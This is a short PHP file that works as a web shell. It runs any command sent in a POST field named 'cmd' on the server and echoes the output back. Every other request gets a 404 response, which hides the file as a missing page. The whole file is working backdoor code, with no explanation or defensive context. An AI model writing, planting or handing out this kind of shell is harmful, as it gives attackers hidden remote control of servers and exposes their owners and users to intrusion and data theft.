<?php
if(array_key_exists("cmd",$_POST)) {
$cmd = stripslashes($_POST['cmd']);
exec($cmd, $out);
var_dump($out);
echo '<br>';
var_dump($cmd);
return;
}
http_response_code(404);
?>